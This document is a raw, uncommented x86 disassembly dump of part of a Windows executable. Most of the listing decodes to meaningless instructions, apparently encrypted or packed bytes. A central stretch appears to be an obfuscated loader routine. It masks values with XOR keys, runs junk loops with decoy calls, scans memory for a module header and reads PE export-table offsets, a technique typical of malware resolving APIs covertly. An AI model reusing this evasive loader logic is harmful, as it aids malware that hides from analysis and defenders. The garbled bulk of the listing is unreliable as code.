  40ca4d:	fmul   DWORD PTR [ebx+0x49]
  40ca50:	adc    ebp,DWORD PTR [edx-0x1e]
  40ca53:	xor    eax,0x9001fb85
  40ca58:	gs out dx,eax
  40ca5a:	jmp    0xb4b96a00
  40ca5f:	stos   BYTE PTR es:[edi],al
  40ca60:	iret   
  40ca61:	mov    bh,0x4b
  40ca63:	outs   dx,DWORD PTR ds:[esi]
  40ca64:	jns    0x40ca03
  40ca66:	jecxz  0x40ca26
  40ca68:	fcmovbe st,st(2)
  40ca6a:	out    dx,eax
  40ca6b:	sti    
  40ca6c:	sub    al,0xa3
  40ca6e:	jp     0x40c9f0
  40ca70:	mov    esi,0x5f98c253
  40ca75:	pop    esi
  40ca76:	aad    0x13
  40ca78:	jns    0x40caa7
  40ca7a:	mov    al,ds:0x995babe2
  40ca7f:	inc    edx
  40ca80:	mov    edx,0x5246ce45
  40ca85:	add    cl,ah
  40ca87:	inc    ecx
  40ca88:	mov    BYTE PTR [ecx-0x218a57ed],ch
  40ca8e:	push   es
  40ca8f:	rcl    BYTE PTR [edx+0x17],cl
  40ca92:	adc    ebp,edx
  40ca94:	push   ebp
  40ca95:	sahf   
  40ca96:	sbb    al,0xe3
  40ca98:	xor    DWORD PTR [ebx],0x2a2df390
  40ca9e:	jo     0x40ca4d
  40caa0:	mov    al,0x9e
  40caa2:	xor    al,0x6d
  40caa4:	xor    DWORD PTR [esi+0x26],esp
  40caa7:	out    dx,eax
  40caa8:	jge    0x40cadb
  40caaa:	inc    ebp
  40caab:	jns    0x40ca31
  40caad:	mov    dl,0x1
  40caaf:	sbb    BYTE PTR [ebx+0x7d8bfc45],cl
  40cab5:	clc    
  40cab6:	add    edi,DWORD PTR [eax]
  40cab8:	mov    DWORD PTR [ebp-0x8],edi
  40cabb:	mov    eax,DWORD PTR [ebp+0xc]
  40cabe:	mov    edi,DWORD PTR [ebp+0xc]
  40cac1:	xor    edi,ecx
  40cac3:	xor    eax,ecx
  40cac5:	lea    eax,[eax+edi*1+0x64e5ba]
  40cacc:	mov    edi,DWORD PTR [ebp+0xc]
  40cacf:	xor    edi,ecx
  40cad1:	add    edi,edx
  40cad3:	imul   eax,edi
  40cad6:	mov    edi,DWORD PTR [ebp+0xc]
  40cad9:	xor    edi,ecx
  40cadb:	sub    edi,eax
  40cadd:	mov    eax,DWORD PTR [ebp-0x4]
  40cae0:	add    edi,edx
  40cae2:	cmp    DWORD PTR [eax],edi
  40cae4:	mov    eax,DWORD PTR [ebp-0x4]
  40cae7:	mov    edi,DWORD PTR [ebp+0x10]
  40caea:	jg     0x40cafd
  40caf0:	xor    edi,ecx
  40caf2:	mov    ebx,esi
  40caf4:	sub    ebx,edi
  40caf6:	add    DWORD PTR [eax],ebx
  40caf8:	jmp    0x40cb03
  40cafd:	xor    edi,ecx
  40caff:	add    edi,edx
  40cb01:	add    DWORD PTR [eax],edi
  40cb03:	mov    eax,DWORD PTR [ebp-0x8]
  40cb06:	mov    edi,DWORD PTR [ebp-0x10]
  40cb09:	mov    eax,DWORD PTR [eax]
  40cb0b:	xor    edi,ecx
  40cb0d:	add    edi,0x3272dc
  40cb13:	not    edi
  40cb15:	and    eax,edi
  40cb17:	movsx  di,BYTE PTR [eax+0x1]
  40cb1c:	mov    ebx,0x3b4c
  40cb21:	sub    di,bx
  40cb24:	mov    ebx,0x8a89
  40cb29:	xor    di,bx
  40cb2c:	mov    ebx,0x4f87
  40cb31:	cmp    di,bx
  40cb34:	jne    0x40cb5c
  40cb3a:	movsx  di,BYTE PTR [eax]
  40cb3e:	mov    ebx,0x3b4c
  40cb43:	sub    di,bx
  40cb46:	mov    ebx,0x8a89
  40cb4b:	xor    di,bx
  40cb4e:	mov    ebx,0x4f88
  40cb53:	cmp    di,bx
  40cb56:	je     0x40cb6c
  40cb5c:	mov    edi,DWORD PTR [ebp-0x10]
  40cb5f:	xor    edi,ecx
  40cb61:	mov    ebx,esi
  40cb63:	sub    ebx,edi
  40cb65:	add    eax,ebx
  40cb67:	jmp    0x40cb17
  40cb6c:	mov    esi,DWORD PTR [ebp-0x14]
  40cb6f:	mov    esi,DWORD PTR [esi]
  40cb71:	mov    edi,DWORD PTR [eax+0x3c]
  40cb74:	lea    esi,[edi+esi*8+0x78]
  40cb78:	mov    esi,DWORD PTR [esi+eax*1]
  40cb7b:	mov    DWORD PTR [ebp-0x8],esi
  40cb7e:	mov    esi,DWORD PTR [ebp+0x8]
  40cb81:	xor    esi,ecx
  40cb83:	add    esi,edx
  40cb85:	mov    DWORD PTR [ebp-0x14],esi
  40cb88:	mov    esi,DWORD PTR [ebp+0x8]
  40cb8b:	mov    edi,DWORD PTR [ebp-0x8]
  40cb8e:	xor    esi,ecx
  40cb90:	add    esi,edx
  40cb92:	pop    ebx
  40cb93:	cmp    edi,esi
  40cb95:	jne    0x40cbb3
  40cb9b:	mov    eax,DWORD PTR [ebp+0xc]
  40cb9e:	xor    eax,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cba3:	add    eax,edx
  40cba5:	imul   eax,ecx
  40cba8:	mov    DWORD PTR [ebp-0x8],eax
  40cbab:	push   DWORD PTR [ebp+0x18]
  40cbae:	jmp    0x40cc07
  40cbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbb6:	add    ecx,eax
  40cbb8:	mov    DWORD PTR [ebp-0x14],ecx
  40cbbb:	mov    ecx,DWORD PTR [ebp-0x14]
  40cbbe:	mov    ecx,DWORD PTR [ecx+0xc]
  40cbc1:	movsx  cx,BYTE PTR [ecx+eax*1]
  40cbc6:	mov    edx,0x3b4c
  40cbcb:	sub    cx,dx
  40cbce:	mov    edx,0x8a89
  40cbd3:	xor    cx,dx
  40cbd6:	mov    edx,0x4e76
  40cbdb:	cmp    cx,dx
  40cbde:	jne    0x40cbab
  40cbe4:	mov    ecx,DWORD PTR ds:0x42e435
  40cbea:	mov    ecx,DWORD PTR [ecx+0x198]
  40cbf0:	mov    DWORD PTR [ecx],eax
  40cbf2:	jmp    0x40cc18
  40cbf7:	mov    ecx,DWORD PTR [ebp+0x18]
  40cbfa:	cmp    ecx,0xf89c85b2
  40cc00:	jne    0x40cc18
  40cc06:	push   eax
  40cc07:	push   DWORD PTR [ebp+0x14]
  40cc0a:	push   DWORD PTR [ebp+0x10]
  40cc0d:	push   DWORD PTR [ebp+0xc]
  40cc10:	push   DWORD PTR [ebp+0x8]
  40cc13:	call   0x40a327
  40cc18:	pop    edi
  40cc19:	pop    esi
  40cc1a:	leave  
  40cc1b:	ret    0x14
  40cc1e:	push   ebp
  40cc1f:	mov    ebp,esp
  40cc21:	push   ecx
  40cc22:	push   ecx
  40cc23:	add    DWORD PTR ds:0x42b010,edx
  40cc29:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  40cc30:	sub    DWORD PTR ds:0x429024,0x76a8
  40cc3a:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  40cc41:	and    DWORD PTR ds:0x42b018,edi
  40cc47:	mov    eax,DWORD PTR [ebp-0x4]
  40cc4a:	adc    DWORD PTR ds:0x429018,edx
  40cc50:	push   esi
  40cc51:	and    DWORD PTR ds:0x42a000,0x0
  40cc5b:	jmp    0x40cc6d
  40cc60:	mov    esi,DWORD PTR ds:0x42a000
  40cc66:	inc    esi
  40cc67:	mov    DWORD PTR ds:0x42a000,esi
  40cc6d:	cmp    DWORD PTR ds:0x42a000,0x1a
  40cc74:	jae    0x40cc98
  40cc7a:	cmp    DWORD PTR ds:0x42a000,0x26
  40cc81:	jne    0x40cc8d
  40cc87:	call   DWORD PTR ds:0x42ed51
  40cc8d:	jmp    0x40cc60
  40cc92:	sub    edx,0x54cb
  40cc98:	mov    esi,DWORD PTR [ebp-0x8]
  40cc9b:	and    DWORD PTR ds:0x429018,0x0
  40cca5:	jmp    0x40ccb7
  40ccaa:	mov    ecx,DWORD PTR ds:0x429018
  40ccb0:	inc    ecx
  40ccb1:	mov    DWORD PTR ds:0x429018,ecx
  40ccb7:	cmp    DWORD PTR ds:0x429018,0x1e
  40ccbe:	jae    0x40ccf6
  40ccc4:	cmp    DWORD PTR ds:0x429018,0x8
  40cccb:	jne    0x40ccd7
  40ccd1:	call   DWORD PTR ds:0x42ed55
  40ccd7:	cmp    DWORD PTR ds:0x429018,0x7
  40ccde:	jne    0x40ccf1
  40cce4:	mov    ecx,DWORD PTR ds:0x429018
  40ccea:	inc    ecx
  40cceb:	mov    DWORD PTR ds:0x429018,ecx
  40ccf1:	jmp    0x40ccaa
  40ccf6:	mov    edx,0x7510896
  40ccfb:	mov    ecx,DWORD PTR ds:0x42d00c
  40cd01:	sub    DWORD PTR ds:0x42a004,ecx
  40cd07:	xor    eax,edx
  40cd09:	xor    esi,edx
  40cd0b:	mov    DWORD PTR ds:0x42b00c,0x13
  40cd15:	cmp    DWORD PTR ds:0x42b00c,0x0
  40cd1c:	je     0x40cd7c
  40cd22:	cmp    DWORD PTR ds:0x42b00c,0x2
  40cd29:	jne    0x40cd50
  40cd2f:	push   DWORD PTR [ebp-0x14]
  40cd32:	push   0x6af7
  40cd37:	push   0x42b010
  40cd3c:	push   0x84d2
  40cd41:	push   DWORD PTR [ebp-0x10]
  40cd44:	push   DWORD PTR [ebp-0x20]
  40cd47:	push   DWORD PTR [ebp-0x28]
  40cd4a:	call   DWORD PTR ds:0x42ed59
  40cd50:	cmp    DWORD PTR ds:0x42b00c,0x3
  40cd57:	jne    0x40cd6a
  40cd5d:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd63:	dec    ecx
  40cd64:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd6a:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd70:	dec    ecx
  40cd71:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd77:	jmp    0x40cd15
  40cd7c:	mov    ecx,0x3272dd
  40cd81:	add    esi,ecx
  40cd83:	add    eax,ecx
  40cd85:	imul   eax,esi
  40cd88:	mov    esi,DWORD PTR [ebp+0xc]
  40cd8b:	cmp    esi,eax
  40cd8d:	jne    0x40cda9
  40cd93:	mov    eax,DWORD PTR [ebp-0x4]
  40cd96:	mov    esi,DWORD PTR [ebp-0x8]
  40cd99:	xor    eax,edx
  40cd9b:	xor    esi,edx
  40cd9d:	add    eax,ecx
  40cd9f:	add    esi,ecx
  40cda1:	imul   eax,esi
  40cda4:	jmp    0x40f15e
  40cda9:	mov    eax,DWORD PTR [ebp+0xc]
  40cdac:	mov    eax,DWORD PTR [eax+0x78]
  40cdaf:	mov    DWORD PTR [ebp+0xc],eax
  40cdb2:	mov    eax,DWORD PTR [ebp-0x4]
  40cdb5:	mov    esi,DWORD PTR [ebp-0x8]
  40cdb8:	xor    eax,edx
  40cdba:	xor    esi,edx
  40cdbc:	add    eax,ecx
  40cdbe:	add    esi,ecx
  40cdc0:	imul   eax,esi
  40cdc3:	jmp    0x40f13d
  40cdc8:	push   esi
  40cdc9:	pop    ss
  40cdca:	rcl    DWORD PTR [ebx-0x6d],cl
  40cdcd:	fwait
  40cdce:	(bad)  
  40cdcf:	pop    ss
  40cdd0:	push   ds
  40cdd1:	outs   dx,BYTE PTR ds:[esi]
  40cdd2:	adc    DWORD PTR ds:0xfc9e664,ebx
  40cdd8:	fldl2t 
  40cdda:	jp     0x40ce56
  40cddc:	sbb    DWORD PTR [edi+0x7a],ebx
  40cddf:	jp     0x40cdda
  40cde1:	push   edi
  40cde2:	out    dx,al
  40cde3:	dec    edi
  40cde4:	fistp  WORD PTR [ebx]
  40cde6:	pop    ss
  40cde7:	into   
  40cde8:	mov    ecx,0x4add5d61
  40cded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdee:	div    DWORD PTR [esi-0x6ed4707e]
  40cdf4:	xlat   BYTE PTR ds:[ebx]
  40cdf5:	leave  
  40cdf6:	jo     0x40ce44
  40cdf8:	xchg   ebx,eax
  40cdf9:	xor    al,0x8e
  40cdfb:	jl     0x40cdc1
  40cdfd:	lods   eax,DWORD PTR ds:[esi]
  40cdfe:	dec    edx
  40cdff:	scas   eax,DWORD PTR es:[edi]
  40ce00:	dec    BYTE PTR [ecx+0x48]
  40ce03:	jno    0x40ce12
  40ce05:	cmp    DWORD PTR [ebp-0x54218f6],ebx
  40ce0b:	sbb    al,0xb1
  40ce0d:	test   DWORD PTR [edi-0x826ba3c],eax
  40ce13:	js     0x40ce7b
  40ce15:	pop    edi
  40ce16:	ds xor eax,0xd9c1eb05
  40ce1c:	das    
  40ce1d:	out    dx,eax
  40ce1e:	in     al,0xaa
  40ce20:	fsub   QWORD PTR [esi+0x5b]
  40ce23:	and    DWORD PTR [edi+0x31],esp
  40ce26:	div    BYTE PTR [edi]
  40ce28:	nop
  40ce29:	es cmp eax,0x96dc6400
  40ce2f:	inc    ebp
  40ce30:	into   
  40ce31:	push   0xe296e90
  40ce36:	and    eax,0x45c896c4
  40ce3b:	aas    
  40ce3c:	push   edx
  40ce3d:	xchg   ecx,eax
  40ce3e:	push   es
  40ce3f:	dec    esp
  40ce40:	jmp    0x40ce02
  40ce42:	add    BYTE PTR [edi+0x32],dl
  40ce45:	pop    ss
  40ce46:	test   al,0x94
  40ce48:	jmp    0x40ce0a
  40ce4a:	stos   DWORD PTR es:[edi],eax
  40ce4b:	inc    esp
  40ce4c:	mov    ah,0x84
  40ce4e:	ror    DWORD PTR [ebp-0x249a7496],1
  40ce54:	sub    al,0x2d
  40ce56:	sub    eax,0xcbc1ab12
  40ce5b:	loopne 0x40ce09
  40ce5d:	jp     0x40ce25
  40ce5f:	not    BYTE PTR [ecx]
  40ce61:	repnz aaa 
  40ce63:	loope  0x40ce77
  40ce65:	add    eax,0x3b383249
  40ce6a:	(bad)  
  40ce6b:	or     eax,0x6570076c
  40ce70:	jo     0x40ce2e
  40ce72:	jle    0x40cea5
  40ce74:	pop    esp
  40ce75:	call   0x2d569236
  40ce7a:	add    esi,DWORD PTR [esi+0x4]
  40ce7d:	pusha  
  40ce7e:	mov    al,0x19
  40ce80:	data16 mov al,0x3c
  40ce83:	pop    edx
  40ce84:	push   0x8ad33dc1
  40ce89:	push   cs
  40ce8a:	jle    0x40ceb3
  40ce8c:	je     0x40cf02
  40ce8e:	fist   WORD PTR [eax+0x7fb8bd2]
  40ce94:	sbb    BYTE PTR [esi],dh
  40ce96:	loop   0x40cf0e
  40ce98:	stc    
  40ce99:	inc    ecx
  40ce9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce9b:	in     al,0xe6
  40ce9d:	push   edx
  40ce9e:	push   edi
  40ce9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea0:	push   ss
  40cea1:	mul    BYTE PTR [edx+0x27]
  40cea4:	repnz sub eax,0xeda5b1b9
  40ceaa:	mov    ds:0x3dfd9506,al
  40ceaf:	fcmovbe st,st(7)
  40ceb1:	mov    ecx,0xb72f7a8d
  40ceb6:	fsub   st,st(7)
  40ceb8:	jmp    0x71c1:0xa20557e9
  40cebf:	inc    ebp
  40cec0:	fist   WORD PTR [eax]
  40cec2:	call   0x3b41:0xe457b3c1
  40cec9:	je     0x40cef9
  40cecb:	add    al,0x83
  40cecd:	pop    ecx
  40cece:	dec    esi
  40cecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ced0:	inc    eax
  40ced1:	(bad)  
  40ced3:	mov    ?,ecx
  40ced5:	rcr    BYTE PTR [edi+0x7639e356],0xfe
  40cedc:	(bad)  
  40cedd:	out    0xdf,al
  40cedf:	(bad)  
  40cee0:	enter  0x8449,0xd8
  40cee4:	popa   
  40cee5:	push   eax
  40cee6:	ret    
  40cee7:	clc    
  40cee8:	push   eax
  40cee9:	push   0xa49c5c2c
  40ceee:	je     0x40cecc
  40cef0:	jmp    0x40cedd
  40cef2:	push   es
  40cef3:	enter  0xd45d,0x29
  40cef7:	xor    bh,BYTE PTR [ecx-0x79a18670]
  40cefd:	into   
  40cefe:	fimul  DWORD PTR [ebp+0x41]
  40cf01:	ja     0x40cf2a
  40cf03:	test   DWORD PTR [ebp+0x41ce400d],0x120bfcc3
  40cf0d:	fdivr  DWORD PTR [esi+0x25144d4a]
  40cf13:	dec    ecx
  40cf15:	cmp    ebx,DWORD PTR [edi-0x9]
  40cf18:	aas    
  40cf19:	loop   0x40cf56
  40cf1b:	mov    bh,0x7f
  40cf1d:	jno    0x40cea3
  40cf1f:	push   0xf2db7df8
  40cf24:	pop    edi
  40cf25:	jge    0x40cf67
  40cf27:	mov    edi,0x54f1f99f
  40cf2c:	pop    ss
  40cf2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf2e:	cld    
  40cf2f:	ficomp DWORD PTR [esi-0x42e57210]
  40cf35:	rol    BYTE PTR [edi-0x667ae5e7],1
  40cf3b:	enter  0x2720,0x22
  40cf3f:	call   0xbe18:0xb8221296
  40cf46:	(bad)  [esi]
  40cf48:	aad    0x60
  40cf4a:	xchg   ebp,eax
  40cf4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4c:	pop    ebp
  40cf4d:	sar    DWORD PTR ds:0x7baaff9d,1
  40cf53:	add    eax,0x9f813247
  40cf58:	xor    edx,edi
  40cf5a:	je     0x40cf4c
  40cf5c:	mov    eax,0x6b903106
  40cf61:	test   al,0x13
  40cf63:	push   ebx
  40cf64:	div    DWORD PTR [edx-0x59]
  40cf67:	jl     0x40cf37
  40cf69:	aam    0x8e
  40cf6b:	scas   eax,DWORD PTR es:[edi]
  40cf6c:	jne    0x40cfaa
  40cf6e:	and    ah,BYTE PTR [edi-0x80]
  40cf71:	mov    bl,0xbe
  40cf73:	xor    BYTE PTR [eax],dl
  40cf75:	(bad)  
  40cf76:	aad    0x59
  40cf78:	xlat   BYTE PTR ds:[ebx]
  40cf79:	inc    edi
  40cf7a:	fidivr WORD PTR ds:0x51626dfa
  40cf80:	inc    esp
  40cf81:	xor    bh,dh
  40cf83:	das    
  40cf84:	addr16 fwait
  40cf86:	in     al,0xf3
  40cf88:	add    eax,DWORD PTR [ebp+0x689afe3c]
  40cf8e:	cmp    BYTE PTR [edi-0x70f6a15a],ch
  40cf94:	jmp    0x40cf44
  40cf96:	cmp    DWORD PTR [ebx],ebp
  40cf98:	dec    esi
  40cf99:	int    0x6
  40cf9b:	outs   dx,BYTE PTR ds:[esi]
  40cf9c:	popa   
  40cf9d:	and    edx,DWORD PTR [edi-0x73]
  40cfa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfa1:	mov    ds,WORD PTR [edi-0x1ca45f58]
  40cfa7:	in     al,0x9d
  40cfa9:	push   esp
  40cfaa:	pop    ss
  40cfab:	xchg   esp,eax
  40cfac:	jae    0x40cfa0
  40cfae:	inc    esp
  40cfaf:	fwait
  40cfb0:	sti    
  40cfb1:	cmc    
  40cfb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfb3:	repz inc esp
  40cfb5:	mov    ecx,0x21e0e607
  40cfba:	cli    
  40cfbb:	sub    al,0xaf
  40cfbd:	outs   dx,BYTE PTR ds:[esi]
  40cfbe:	sbb    eax,0x763a03fa
  40cfc3:	cmp    DWORD PTR [edi],edi
  40cfc5:	(bad)  
  40cfc6:	jp     0x40cfc6
  40cfc8:	jae    0x40cf65
  40cfca:	(bad)  
  40cfcb:	pop    ebp
  40cfcc:	aam    0xe7
  40cfce:	loopne 0x40cfae
  40cfd0:	pop    eax
  40cfd1:	loop   0x40cfe9
  40cfd3:	cmc    
  40cfd4:	jae    0x40cf84
  40cfd6:	adc    al,0x8
  40cfd8:	or     BYTE PTR [esi-0x73],dh
  40cfdb:	loopne 0x40d036
  40cfdd:	cdq    
  40cfde:	es xor eax,0xadc9efd3
  40cfe4:	add    eax,DWORD PTR [ecx-0x2b8d5fb5]
  40cfea:	into   
  40cfeb:	cld    
  40cfec:	sahf   
  40cfed:	inc    edi
  40cfee:	pop    ebx
  40cfef:	push   edx
  40cff0:	(bad)  
  40cff2:	out    dx,al
  40cff3:	loope  0x40d072
  40cff5:	mov    bh,0x3c
  40cff7:	or     dh,BYTE PTR [edi-0x21]
  40cffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cffb:	into   
  40cffc:	mov    bl,0x9c
  40cffe:	idiv   DWORD PTR [edi-0x3e7f67a2]
  40d004:	xchg   edi,eax
  40d005:	iret   
  40d006:	xchg   ebp,eax
  40d007:	mov    edi,0x18a3d215
  40d00c:	fiadd  WORD PTR [ecx-0x4bde52f0]
  40d012:	cmp    edx,edx
  40d014:	or     al,0x9e
  40d016:	inc    edi
  40d017:	pop    edx
  40d018:	cmc    
  40d019:	pop    esi
  40d01a:	rcr    DWORD PTR [eax+0x60],cl
  40d01d:	sbb    ebp,DWORD PTR [edx+0x2839922a]
  40d023:	xchg   BYTE PTR [ebp-0x71b78191],bh
  40d029:	pusha  
  40d02a:	or     BYTE PTR [ebx],0x6c
  40d02d:	xchg   esi,eax
  40d02e:	mov    ecx,DWORD PTR [ebx+0x62]
  40d031:	and    al,0x73
  40d033:	ss push es
  40d035:	out    dx,eax
  40d036:	out    0x3f,al
  40d038:	in     al,dx
  40d039:	outs   dx,BYTE PTR ds:[esi]
  40d03a:	int3   
  40d03b:	jnp    0x40cfbd
  40d03d:	xor    BYTE PTR [eax+edx*4],0x65
  40d041:	xor    al,0x20
  40d043:	je     0x40d0b8
  40d045:	mov    dl,0xa4
  40d047:	ins    BYTE PTR es:[edi],dx
  40d048:	cmc    
  40d049:	xchg   edi,eax
  40d04a:	xor    DWORD PTR [ebx],edi
  40d04c:	(bad)  
  40d04d:	jg     0x40d04c
  40d04f:	inc    ebp
  40d050:	xchg   ebp,eax
  40d051:	add    BYTE PTR [edi+eax*8-0x15],bl
  40d055:	add    DWORD PTR [ecx],edi
  40d057:	pop    edx
  40d058:	xor    BYTE PTR [ebx+0x5617dee],dl
  40d05e:	xchg   ebp,eax
  40d05f:	jne    0x40cff8
  40d061:	outs   dx,DWORD PTR ds:[esi]
  40d062:	xor    ebp,0x1f
  40d065:	sub    esp,DWORD PTR [ecx]
  40d067:	mov    ch,0x3e
  40d069:	jno    0x40cff7
  40d06b:	dec    edx
  40d06c:	jo     0x40d00a
  40d06e:	dec    ebx
  40d06f:	les    eax,FWORD PTR [ebx-0x735be63d]
  40d075:	add    al,0xa
  40d077:	mov    ax,ds:0x473c959f
  40d07d:	popf   
  40d07e:	pop    ecx
  40d07f:	(bad)  
  40d081:	pop    esi
  40d082:	jne    0x40d015
  40d084:	jbe    0x40d071
  40d086:	jecxz  0x40d00c
  40d088:	xchg   edi,eax
  40d089:	pop    ecx
  40d08a:	add    esp,0xfffffffc
  40d08d:	xchg   esp,eax
  40d08e:	imul   edi,DWORD PTR ds:0x5e1e424a,0x34
  40d095:	sub    BYTE PTR [esi-0x336ea66],0x3
  40d09c:	mov    ds:0xa7685f3f,eax
  40d0a1:	je     0x40d07b
  40d0a3:	xchg   edi,eax
  40d0a4:	nop
  40d0a5:	sbb    eax,esi
  40d0a7:	mov    BYTE PTR [esi+0x2d9a5e4a],0x34
  40d0ae:	jmp    0x40d0fb
  40d0b0:	call   0x17b56da1
  40d0b5:	loopne 0x40d062
  40d0b7:	jg     0x40d0c0
  40d0b9:	test   ch,0xa5
  40d0bc:	jae    0x40d0f9
  40d0be:	mov    ?,WORD PTR [ebx-0x6f793db2]
  40d0c4:	repnz adc al,0xb
  40d0c7:	inc    ebp
  40d0c8:	jmp    0x3a04:0x90093cd
  40d0cf:	jo     0x40d075
  40d0d1:	fcompp 
  40d0d3:	and    BYTE PTR [ebx-0x2],bl
  40d0d6:	ret    0x3cee
  40d0d9:	lods   eax,DWORD PTR ds:[esi]
  40d0da:	sbb    DWORD PTR [edx],ecx
  40d0dc:	sbb    BYTE PTR [ecx+eax*2-0x66],0xf0
  40d0e1:	jns    0x40d0cf
  40d0e3:	lods   al,BYTE PTR ds:[esi]
  40d0e4:	sub    esi,DWORD PTR [ecx]
  40d0e6:	sub    eax,0x3993bf5d
  40d0eb:	sub    eax,0x61676ff
  40d0f0:	jne    0x40d0b1
  40d0f2:	cli    
  40d0f3:	aad    0x92
  40d0f5:	int3   
  40d0f6:	dec    edx
  40d0f7:	xor    ch,bl
  40d0f9:	fmul   st(5),st
  40d0fb:	sub    DWORD PTR [esi+0x2f9a39a3],ebx
  40d101:	add    edx,DWORD PTR [ecx-0x444560f4]
  40d107:	mov    edi,0x7a1ff8ab
  40d10c:	(bad)  
  40d10d:	sub    eax,DWORD PTR [edi]
  40d10f:	jae    0x40d179
  40d111:	mov    WORD PTR [ecx+0x1c],ss
  40d114:	je     0x40d12c
  40d116:	sahf   
  40d117:	push   ebx
  40d118:	stos   DWORD PTR es:[edi],eax
  40d119:	addr16 sahf 
  40d11b:	jmp    0xe324fef7
  40d120:	xor    al,0x5d
  40d122:	or     DWORD PTR [ecx],esp
  40d124:	push   es
  40d125:	ss imul esp,edx,0x52
  40d129:	push   ebp
  40d12a:	cmp    eax,0x489db93e
  40d12f:	jnp    0x40d138
  40d131:	xchg   ebx,eax
  40d132:	and    ebp,ebx
  40d134:	pushf  
  40d135:	xchg   BYTE PTR [esi],ch
  40d137:	sub    edx,DWORD PTR [esi-0x63259fb2]
  40d13d:	push   0x17
  40d13f:	or     al,0x25
  40d141:	jg     0x40d11f
  40d143:	dec    eax
  40d144:	inc    ecx
  40d145:	push   ss
  40d146:	xor    BYTE PTR [edi-0x14],cl
  40d149:	xor    al,0x8c
  40d14b:	cs push ebx
  40d14d:	dec    edi
  40d14e:	xor    al,0xe0
  40d150:	and    DWORD PTR [ebp-0x1],edi
  40d153:	mov    ds:0x7ce0cc47,eax
  40d158:	pop    eax
  40d159:	sub    ecx,edx
  40d15b:	ds jmp 0xae78:0xb2d4887f
  40d163:	nop
  40d164:	dec    esi
  40d165:	jmp    eax
  40d167:	imul   BYTE PTR [ebp+0x59d515ed]
  40d16d:	push   ss
  40d16e:	and    dl,BYTE PTR [ebx-0x46]
  40d171:	xlat   BYTE PTR ds:[ebx]
  40d172:	test   BYTE PTR [edi-0x2a2be8e1],bh
  40d178:	push   esp
  40d179:	dec    ebp
  40d17a:	inc    ebp
  40d17b:	sbb    eax,0x8c824a33
  40d180:	dec    ebp
  40d181:	cmp    eax,0x466a9f33
  40d186:	inc    esp
  40d187:	hlt    
  40d188:	or     BYTE PTR [ecx+0x1fdeb64],bh
  40d18e:	xor    esi,DWORD PTR [ebx-0x69b4aa1]
  40d194:	mov    esi,ebx
  40d196:	ror    BYTE PTR [edi],0xc7
  40d199:	adc    cl,bh
  40d19b:	dec    edx
  40d19c:	push   ebx
  40d19d:	lods   eax,DWORD PTR ds:[esi]
  40d19e:	in     eax,0x94
  40d1a0:	and    eax,0xf491960b
  40d1a5:	outs   dx,BYTE PTR ds:[esi]
  40d1a6:	xor    al,0x4b
  40d1a8:	or     al,0x3
  40d1aa:	js     0x40d177
  40d1ac:	jg     0x40d229
  40d1ae:	jbe    0x40d18e
  40d1b0:	push   esi
  40d1b1:	test   eax,0x6429ffcb
  40d1b6:	and    DWORD PTR [ecx+0xc],0x66
  40d1ba:	in     al,dx
  40d1bb:	cmp    WORD PTR [ebx+eax*4-0x3d59e474],bx
  40d1c3:	mov    ah,0xa3
  40d1c5:	sahf   
  40d1c6:	push   cs
  40d1c7:	adc    ah,bh
  40d1c9:	sbb    BYTE PTR [ebx],dh
  40d1cb:	mov    ebx,0x294256c5
  40d1d0:	push   cs
  40d1d1:	cli    
  40d1d2:	mov    cl,0x79
  40d1d4:	imul   esp,eax,0xfc7e6dee
  40d1da:	push   0xffffff92
  40d1dc:	call   0x27df9c73
  40d1e1:	inc    ebp
  40d1e2:	(bad)  
  40d1e3:	into   
  40d1e4:	pushf  
  40d1e5:	pop    eax
  40d1e6:	into   
  40d1e7:	push   0xffffffb3
  40d1e9:	sti    
  40d1ea:	ret    
  40d1eb:	cdq    
  40d1ec:	dec    edx
  40d1ed:	mov    ds:0x77e9852,al
  40d1f2:	sar    esi,0x3e
  40d1f5:	inc    esi
  40d1f6:	call   0xdd91970
  40d1fb:	xor    bh,al
  40d1fd:	iret   
  40d1fe:	dec    edi
  40d1ff:	dec    DWORD PTR [eax+0x16293b0a]
  40d205:	repz (bad) 
  40d207:	xor    dl,BYTE PTR [esi]
  40d209:	jp     0x40d20a
  40d20b:	add    eax,0x54a71321
  40d210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d211:	pop    ebp
  40d212:	ret    
  40d213:	lods   eax,DWORD PTR ds:[esi]
  40d214:	xchg   esi,eax
  40d215:	scas   al,BYTE PTR es:[edi]
  40d216:	inc    ebx
  40d217:	das    
  40d218:	add    eax,0x8a33743f
  40d21d:	xor    BYTE PTR [edi-0x19db53cd],bh
  40d223:	xor    eax,0x1fdff9ba
  40d228:	mov    edi,0xfd83a5f1
  40d22d:	ficom  WORD PTR [edi-0x54649cf8]
  40d233:	xor    BYTE PTR [esi+0x5e],0xd5
  40d237:	(bad)  
  40d238:	sbb    DWORD PTR [eax-0x22225877],0xfffffff3
  40d23f:	sti    
  40d240:	jp     0x40d299
  40d242:	inc    esi
  40d243:	out    0x64,al
  40d245:	pop    ebp
  40d246:	add    DWORD PTR ds:0x12a5b373,0xffffffdb
  40d24d:	outs   dx,BYTE PTR ds:[esi]
  40d24e:	dec    ecx
  40d24f:	mov    dh,0xed
  40d251:	(bad)  
  40d252:	stc    
  40d253:	lahf   
  40d254:	sbb    BYTE PTR [esi-0x6bdab738],dl
  40d25a:	pop    ecx
  40d25b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d25c:	ret    
  40d25d:	stc    
  40d25e:	call   0xaa29:0xbd5a66d8
